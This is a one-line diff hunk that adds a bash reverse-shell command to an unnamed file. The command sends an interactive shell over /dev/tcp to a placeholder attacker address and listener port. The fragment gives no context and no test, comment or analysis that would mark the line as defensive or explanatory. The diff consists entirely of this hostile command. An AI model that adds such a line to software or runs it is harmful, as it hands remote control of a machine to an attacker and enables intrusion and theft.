@@ -1,0 +1,1 @@
+bash -c 'bash -i >& /dev/tcp/<your-ip>/<listener-port> 0>&1'
